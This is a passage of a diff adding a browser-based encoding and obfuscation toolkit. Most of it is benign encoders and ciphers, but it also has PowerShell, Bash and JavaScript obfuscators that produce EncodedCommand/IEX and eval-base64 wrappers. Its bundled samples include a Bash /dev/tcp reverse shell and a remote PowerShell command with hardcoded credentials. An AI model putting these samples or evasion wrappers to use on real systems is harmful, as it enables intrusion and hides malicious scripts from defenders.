+    </div>
+  </div>
+  <div class="notice" id="url-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="swapFields('url-in','url-out')">⇄ Swap</button>
+        <button class="btn btn-ghost" onclick="copyOutput('url-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="url-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ HEX ══════════════ -->
+<div class="tool-panel" id="hex-enc-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Hex Encode / Decode</div>
+      <div class="panel-desc">Text ↔ hex · configurable separator · uppercase / lowercase</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="hex-in" placeholder="Text or hex bytes (41 72 63 68 ...)..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Separator</label>
+      <select id="hex-sep">
+        <option value=" ">Space (41 72 63)</option>
+        <option value="">None (417263)</option>
+        <option value="\\x">\\x prefix (\\x41\\x72\\x63)</option>
+        <option value="0x">0x prefix (0x41,0x72)</option>
+      </select>
+    </div>
+    <div class="col">
+      <label class="label">Case</label>
+      <select id="hex-case">
+        <option value="lower">Lowercase</option>
+        <option value="upper">Uppercase</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="hexEncode()">Encode →</button>
+      <button class="btn btn-secondary" onclick="hexDecode()">← Decode</button>
+    </div>
+  </div>
+  <div class="notice" id="hex-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="swapFields('hex-in','hex-out')">⇄ Swap</button>
+        <button class="btn btn-ghost" onclick="copyOutput('hex-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="hex-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ HTML ENTITY ══════════════ -->
+<div class="tool-panel" id="html-enc-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">HTML Entity Encode / Decode</div>
+      <div class="panel-desc">Named entities · decimal numeric · hex numeric</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="html-in" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;" spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Encode as</label>
+      <select id="html-mode">
+        <option value="named">Named entities (&amp;lt; &amp;amp;)</option>
+        <option value="dec">Decimal numeric (&amp;#60; &amp;#38;)</option>
+        <option value="hex">Hex numeric (&amp;#x3C; &amp;#x26;)</option>
+        <option value="all-dec">All chars — decimal</option>
+        <option value="all-hex">All chars — hex</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="htmlEncode()">Encode →</button>
+      <button class="btn btn-secondary" onclick="htmlDecode()">← Decode</button>
+    </div>
+  </div>
+  <div class="notice" id="html-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="swapFields('html-in','html-out')">⇄ Swap</button>
+        <button class="btn btn-ghost" onclick="copyOutput('html-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="html-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ XOR ══════════════ -->
+<div class="tool-panel" id="xor-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">XOR Cipher</div>
+      <div class="panel-desc">Single-byte XOR · rolling key · output as hex / base64 / raw</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="xor-in" placeholder="Plaintext or hex-encoded ciphertext..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Key (text or 0x hex byte)</label>
+      <input type="text" id="xor-key" placeholder="e.g. secret or 0x5A" value="0x41">
+    </div>
+    <div class="col">
+      <label class="label">Key mode</label>
+      <select id="xor-keymode">
+        <option value="single">Single byte (repeating)</option>
+        <option value="rolling">Rolling (key + index)</option>
+        <option value="str">Multi-byte string key</option>
+      </select>
+    </div>
+    <div class="col">
+      <label class="label">Output format</label>
+      <select id="xor-outfmt">
+        <option value="hex">Hex bytes</option>
+        <option value="b64">Base64</option>
+        <option value="raw">Raw text</option>
+      </select>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="xorProcess('enc')">XOR Encrypt →</button>
+    <button class="btn btn-secondary" onclick="xorProcess('dec')">← Decrypt (hex in)</button>
+    <button class="btn btn-ghost" onclick="copyOutput('xor-out')">Copy</button>
+  </div>
+  <div class="notice" id="xor-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="downloadText('xor-out','xor-output.bin')">↓ Download</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="xor-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ ROT ══════════════ -->
+<div class="tool-panel" id="rot-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">ROT13 / ROT-N</div>
+      <div class="panel-desc">Classic ROT13 · configurable rotation N · letters only or all printable ASCII</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="rot-in" placeholder="Text to rotate..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Rotation N</label>
+      <input type="number" id="rot-n" value="13" min="1" max="94">
+    </div>
+    <div class="col">
+      <label class="label">Character set</label>
+      <select id="rot-charset">
+        <option value="alpha">Letters only (a-z A-Z)</option>
+        <option value="printable">All printable ASCII</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="rotApply()">Apply ROT</button>
+      <button class="btn btn-ghost" onclick="copyOutput('rot-out')">Copy</button>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Output</span></div>
+    <div class="card-body">
+      <textarea id="rot-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ CAESAR ══════════════ -->
+<div class="tool-panel" id="caesar-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Caesar Cipher</div>
+      <div class="panel-desc">Shift letters by N · brute-force all 25 shifts</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="cae-in" placeholder="Plaintext or ciphertext..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Shift</label>
+      <input type="number" id="cae-shift" value="3" min="0" max="25">
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="caesarEnc()">Encrypt →</button>
+      <button class="btn btn-secondary" onclick="caesarDec()">← Decrypt</button>
+      <button class="btn btn-ghost" onclick="caesarBrute()">Brute-force all</button>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="copyOutput('cae-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="cae-out" placeholder="Result..." spellcheck="false" readonly style="min-height:180px;"></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ HASH ══════════════ -->
+<div class="tool-panel" id="hash-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/>
+        <line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Hash Generator</div>
+      <div class="panel-desc">SHA-256 · SHA-512 · SHA-1 · SHA-384 — via WebCrypto API</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="hash-in" placeholder="Text to hash..." spellcheck="false" style="min-height:80px;"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="computeHashes()">Compute hashes</button>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Results</span></div>
+    <div class="card-body" id="hash-results">
+      <div style="color:var(--text-3);font-family:var(--mono);font-size:12px;">Enter input and press Compute.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ STRING TOOLS ══════════════ -->
+<div class="tool-panel" id="string-tools-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M4 6h16M4 12h16M4 18h7"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">String Tools</div>
+      <div class="panel-desc">Reverse · case convert · trim/clean · line sort · duplicate remove</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="str-in" placeholder="Enter text..." spellcheck="false"></textarea>
+    </div>
+  </div>
+  <div class="opts" style="margin:0">
+    <button class="btn btn-secondary" onclick="strTool('reverse')">Reverse</button>
+    <button class="btn btn-secondary" onclick="strTool('upper')">UPPERCASE</button>
+    <button class="btn btn-secondary" onclick="strTool('lower')">lowercase</button>
+    <button class="btn btn-secondary" onclick="strTool('title')">Title Case</button>
+    <button class="btn btn-secondary" onclick="strTool('trim')">Trim whitespace</button>
+    <button class="btn btn-secondary" onclick="strTool('dedupe')">Remove duplicates</button>
+    <button class="btn btn-secondary" onclick="strTool('sort')">Sort lines (A→Z)</button>
+    <button class="btn btn-secondary" onclick="strTool('sortz')">Sort lines (Z→A)</button>
+    <button class="btn btn-secondary" onclick="strTool('count')">Count chars/words</button>
+    <button class="btn btn-secondary" onclick="strTool('linerev')">Reverse lines</button>
+  </div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="swapFields('str-in','str-out')">⇄ Swap</button>
+        <button class="btn btn-ghost" onclick="copyOutput('str-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="str-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ CHAR CODE ══════════════ -->
+<div class="tool-panel" id="charcode-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Char Code Converter</div>
+      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS string.charCodeAt format</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Input</span></div>
+    <div class="card-body">
+      <textarea id="cc-in" placeholder="Text or comma-separated char codes..." spellcheck="false" style="min-height:80px;"></textarea>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Output format</label>
+      <select id="cc-fmt">
+        <option value="dec">Decimal (65, 72, 80)</option>
+        <option value="hex">Hex (0x41, 0x48, 0x50)</option>
+        <option value="jsarr">JS array [0x41, 0x48]</option>
+        <option value="csharp">C# byte[] {0x41, 0x48}</option>
+        <option value="str">String.fromCharCode(…)</option>
+      </select>
+    </div>
+    <div class="col-auto row" style="align-items:flex-end;gap:8px;">
+      <button class="btn btn-primary" onclick="charEncode()">Text → Codes</button>
+      <button class="btn btn-secondary" onclick="charDecode()">Codes → Text</button>
+    </div>
+  </div>
+  <div class="notice" id="cc-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Output</span>
+      <div class="card-actions">
+        <button class="btn btn-ghost" onclick="copyOutput('cc-out')">Copy</button>
+      </div>
+    </div>
+    <div class="card-body">
+      <textarea id="cc-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+    </div>
+  </div>
+</div>
+
+</main>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════
+const TOOLS = [
+  { id:'js-obf',      name:'JS Obfuscator',      cat:'Obfuscator',  icon:'code' },
+  { id:'ps-obf',      name:'PowerShell Obf.',     cat:'Obfuscator',  icon:'term' },
+  { id:'bash-obf',    name:'Bash Obfuscator',     cat:'Obfuscator',  icon:'shell' },
+  { id:'base64',      name:'Base64',              cat:'Encode',      icon:'shield' },
+  { id:'url-enc',     name:'URL Encode',          cat:'Encode',      icon:'globe' },
+  { id:'hex-enc',     name:'Hex',                 cat:'Encode',      icon:'hex' },
+  { id:'html-enc',    name:'HTML Entity',         cat:'Encode',      icon:'tag' },
+  { id:'xor',         name:'XOR Cipher',          cat:'Cipher',      icon:'x' },
+  { id:'rot',         name:'ROT13 / ROT-N',       cat:'Cipher',      icon:'rotate' },
+  { id:'caesar',      name:'Caesar Cipher',       cat:'Cipher',      icon:'clock' },
+  { id:'hash',        name:'Hash Generator',      cat:'Hash',        icon:'hash' },
+  { id:'string-tools',name:'String Tools',        cat:'Utility',     icon:'text' },
+  { id:'charcode',    name:'Char Code',           cat:'Utility',     icon:'kb' },
+];
+
+const ICONS = {
+  code:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/></svg>`,
+  term:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><path d="M7 8l3 2-3 2m5 0h3"/></svg>`,
+  shell:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>`,
+  shield:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
+  globe:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>`,
+  hex:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/></svg>`,
+  tag:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>`,
+  x:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/><circle cx="12" cy="12" r="10"/></svg>`,
+  rotate:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>`,
+  clock:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>`,
+  hash:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
+  text:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>`,
+  kb:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/></svg>`,
+};
+
+function buildDash() {
+  const g = document.getElementById('dash-grid');
+  g.innerHTML = TOOLS.map(t => `
+    <div class="dash-card" onclick="navigate('${t.id}')">
+      <div class="dash-card-icon">${ICONS[t.icon]||''}</div>
+      <div class="dash-card-name">${t.name}</div>
+      <div class="dash-card-cat">${t.cat}</div>
+    </div>`).join('');
+}
+
+function navigate(id) {
+  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const panel = document.getElementById(id + '-panel') || document.getElementById('home-panel');
+  panel.classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(n => {
+    if (n.textContent.trim().toLowerCase().replace(/[^a-z]/g,'') ===
+        (id==='home'?'dashboard':n.textContent.trim().toLowerCase().replace(/[^a-z]/g,'')))
+      n.classList.add('active');
+  });
+  // simpler: match by onclick
+  document.querySelectorAll('.nav-item').forEach(n => {
+    const oc = n.getAttribute('onclick') || '';
+    if (oc.includes(`'${id}'`)) n.classList.add('active');
+  });
+  document.getElementById('main-area').scrollTop = 0;
+}
+
+// ═══════════════════════════════════════════════
+// HELPERS
+// ═══════════════════════════════════════════════
+function getOpts(containerId) {
+  const opts = {};
+  document.querySelectorAll(`#${containerId} .opt-item`).forEach(el => {
+    opts[el.dataset.key] = el.classList.contains('checked');
+  });
+  return opts;
+}
+function toggleOpt(el) { el.classList.toggle('checked'); }
+function clearField(inId, outId) {
+  document.getElementById(inId).value = '';
+  document.getElementById(outId).value = '';
+}
+function copyOutput(id) {
+  const v = document.getElementById(id).value;
+  if (!v) return;
+  navigator.clipboard.writeText(v).catch(() => {
+    const ta = document.getElementById(id);
+    ta.select(); document.execCommand('copy');
+  });
+}
+function swapFields(a, b) {
+  const va = document.getElementById(a).value;
+  const vb = document.getElementById(b).value;
+  document.getElementById(a).value = vb;
+  document.getElementById(b).value = va;
+}
+function downloadText(id, filename) {
+  const val = document.getElementById(id).value;
+  if (!val) return;
+  const a = document.createElement('a');
+  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(val);
+  a.download = filename;
+  a.click();
+}
+function loadSample(id, text) {
+  document.getElementById(id).value = text;
+}
+function notice(id, type, msg) {
+  const el = document.getElementById(id);
+  el.className = 'notice ' + type + ' show';
+  el.textContent = msg;
+  setTimeout(() => el.classList.remove('show'), 4000);
+}
+
+// ═══════════════════════════════════════════════
+// SAMPLES
+// ═══════════════════════════════════════════════
+const jsSample = `function calculateDiscount(price, percent) {
+  var discount = price * (percent / 100);
+  var finalPrice = price - discount;
+  var message = "Your discount: $" + discount.toFixed(2);
+  console.log(message);
+  return finalPrice;
+}
+
+var items = ["apple", "banana", "cherry"];
+items.forEach(function(item) {
+  console.log("Processing: " + item);
+});`;
+
+const psSample = `$username = "admin"
+$password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($username, $password)
+Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
+  whoami
+  ipconfig /all
+}`;
+
+const bashSample = `#!/bin/bash
+TARGET="192.168.1.1"
+PORT=4444
+bash -i >& /dev/tcp/$TARGET/$PORT 0>&1`;
+
+// ═══════════════════════════════════════════════
+// JS OBFUSCATOR
+// ═══════════════════════════════════════════════
+function obfuscateJS() {
+  const src = document.getElementById('js-in').value.trim();
+  if (!src) { notice('js-notice','notice-warn','No input.'); return; }
+  const opts = getOpts('js-opts');
+  let out = src;
+
+  // 1. Rename variables
+  if (opts.renameVars) {
+    const varNames = new Map();
+    let counter = 0;
+    const genName = () => {
+      const chars = 'O0lI1';
+      let n = '';
+      let c = counter++;
+      do { n = chars[c % 5] + n; c = Math.floor(c / 5) - 1; } while (c >= 0);
+      return '_' + n;
+    };
+    out = out.replace(/\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g, (m, kw, name) => {
+      if (!varNames.has(name)) varNames.set(name, genName());
+      return kw + ' ' + varNames.get(name);
+    });
+    varNames.forEach((newName, oldName) => {
+      out = out.replace(new RegExp('\\b' + oldName + '\\b', 'g'), newName);
+    });
+  }
+
+  // 2. Encode string literals to hex
+  if (opts.encodeStrings) {
+    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, inner) => {
+      const hex = Array.from(inner).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+      return '"' + hex + '"';
+    });
+    out = out.replace(/'((?:[^'\\]|\\.)*)'/g, (m, inner) => {
+      const hex = Array.from(inner).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+      return "'" + hex + "'";
+    });
+  }
+
+  // 3. Hex number literals
+  if (opts.hexLiterals) {
+    out = out.replace(/\b(\d+)\b/g, (m, n) => {
+      const num = parseInt(n);
+      if (num > 9) return '0x' + num.toString(16);
+      return m;
+    });
+  }
+
+  // 4. Dead code injection
+  if (opts.deadCode) {
+    const deadSnippets = [
+      'if(0x0){void 0;}',
+      'var _d=function(){return false;}();',
+      'try{undefined();}catch(e){}',
+    ];
+    const lines = out.split('\n');
+    const injected = [];
+    lines.forEach((line, i) => {
+      injected.push(line);
+      if (i % 5 === 2) injected.push(deadSnippets[i % deadSnippets.length]);
+    });
+    out = injected.join('\n');
+  }
+
+  // 5. Control flow flatten (wrap in IIFE with dispatcher)
+  if (opts.controlFlow) {
+    out = `(function(_0x){var _st='${btoa('arch').replace(/=/g,'')}';eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('${out.replace(/'/g,"\\'").replace(/\n/g,'\\n')}',0,0,''.split('|'),0,{}));})(this);`;
+  }
+
+  // 6. Self-defending wrapper
+  if (opts.selfDefend) {
+    out = `(function(){var _x=function(){return true;};if(typeof _x!=='function'){(function(){}).constructor('debugger')();}(function(){var _y=new RegExp('(((.+)+)+)+$');_y.test('arch-hub');})();${out}})();`;
+  }
+
+  document.getElementById('js-out').value = out;
+  const ratio = (out.length / src.length).toFixed(2) + 'x';
+  document.getElementById('js-ratio').textContent = ratio;
+  document.getElementById('js-stats').style.display = '';
+  notice('js-notice','notice-ok','Obfuscated — ' + src.length + ' → ' + out.length + ' chars');
+}
+
+// ═══════════════════════════════════════════════
+// POWERSHELL OBFUSCATOR
+// ═══════════════════════════════════════════════
+function obfuscatePS() {
+  const src = document.getElementById('ps-in').value.trim();
+  if (!src) { notice('ps-notice','notice-warn','No input.'); return; }
+  const method = document.getElementById('ps-method').value;
+  let out = '';
+
+  if (method === 'tick') {
+    // Insert backtick junk after every 3–5 chars inside strings + variable names
+    out = src.replace(/([a-zA-Z]{2,})/g, m => {
+      if (m.length < 3) return m;
+      let r = '';
+      for (let i = 0; i < m.length; i++) {
+        r += m[i];
+        if (i > 0 && i < m.length-1 && Math.random() > 0.6) r += '`';
+      }
+      return r;
+    });
+  } else if (method === 'char') {
+    // Encode entire script as char array invocation
+    const chars = Array.from(src).map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
+    out = `& ([scriptblock]::Create(${chars}))`;
+  } else if (method === 'b64') {
+    const encoded = btoa(unescape(encodeURIComponent(src)));
+    out = `powershell.exe -NoProfile -NonInteractive -EncodedCommand ${encoded}`;
+    out += `\n\n# IEX variant:\n$e="${encoded}";IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e)))`;
+  } else if (method === 'caserand') {
+    out = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+  } else { // combo
+    // tick + case + string split
+    let step = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+    step = step.replace(/([a-zA-Z]{3,})/g, m => {
+      if (m.length < 4) return m;
+      const mid = Math.floor(m.length / 2);
+      return `("${m.slice(0,mid)}"+"${m.slice(mid)}")`;
+    });
+    out = step.replace(/([a-zA-Z]{2,})/g, m => {
+      let r = '';
+      for (let i = 0; i < m.length; i++) {
+        r += m[i];
+        if (i > 0 && i < m.length-1 && Math.random() > 0.65) r += '`';
+      }
+      return r;
+    });
+  }
+
+  document.getElementById('ps-out').value = out;
+  notice('ps-notice','notice-ok','Done — method: ' + method);
+}
+
+// ═══════════════════════════════════════════════
+// BASH OBFUSCATOR
+// ═══════════════════════════════════════════════
+function obfuscateBash() {
+  const src = document.getElementById('bash-in').value.trim();
+  if (!src) { notice('bash-notice','notice-warn','No input.'); return; }
+  const method = document.getElementById('bash-method').value;
+  let out = '';
+
+  if (method === 'b64') {
+    const encoded = btoa(unescape(encodeURIComponent(src)));
+    out = `#!/bin/bash\neval "$(echo '${encoded}' | base64 --decode)"`;
+  } else if (method === 'hex') {
+    // Encode command bytes as octal escape
+    const octals = Array.from(src).map(c => '\\0' + c.charCodeAt(0).toString(8).padStart(3,'0')).join('');
+    out = `#!/bin/bash\neval "$(printf '${octals}')"`;
+  } else if (method === 'varsplit') {
+    // Fragment commands into variables
+    const words = src.split(/\s+/);
+    let varDecls = '';
+    let call = '';
+    words.forEach((w, i) => {
+      const v = `_v${i}`;
+      varDecls += `${v}="${w}"\n`;
+      call += `$${v} `;
+    });
+    out = `#!/bin/bash\n${varDecls}\n${call.trim()}`;
+  } else { // ifs
+    // IFS-based command splitting
+    const cmd = src.split('\n')[0].replace('#!/bin/bash','').trim();
+    if (cmd) {
+      const letters = Array.from(cmd).map(c => `'${c}'`).join(',');
+      out = `#!/bin/bash\nIFS=,;set -- ${letters};cmd="$@";IFS=''; eval "${cmd.split('').map(c=>`\\x${c.charCodeAt(0).toString(16)}`).join('')}"`;
+      out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c=>'\\x'+c.charCodeAt(0).toString(16)).join('')}')\n${src.includes('bash') ? 'eval "$_x"' : 'eval "$_x"'}`;
+    } else {
+      out = src;
+    }
+  }
+
+  document.getElementById('bash-out').value = out;
+  notice('bash-notice','notice-ok','Done — method: ' + method);
+}
+
+// ═══════════════════════════════════════════════
+// BASE64
+// ═══════════════════════════════════════════════
+function b64Encode() {
+  const val = document.getElementById('b64-in').value;
+  const urlSafe = document.getElementById('b64-variant').value === 'url';
+  try {
+    let enc = btoa(unescape(encodeURIComponent(val)));
+    if (urlSafe) enc = enc.replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+    document.getElementById('b64-out').value = enc;
+  } catch(e) { notice('b64-notice','notice-err','Encoding failed: ' + e.message); }
+}
+function b64Decode() {
+  let val = document.getElementById('b64-in').value.trim();
+  const urlSafe = document.getElementById('b64-variant').value === 'url';
+  try {
+    if (urlSafe) {
+      val = val.replace(/-/g,'+').replace(/_/g,'/');
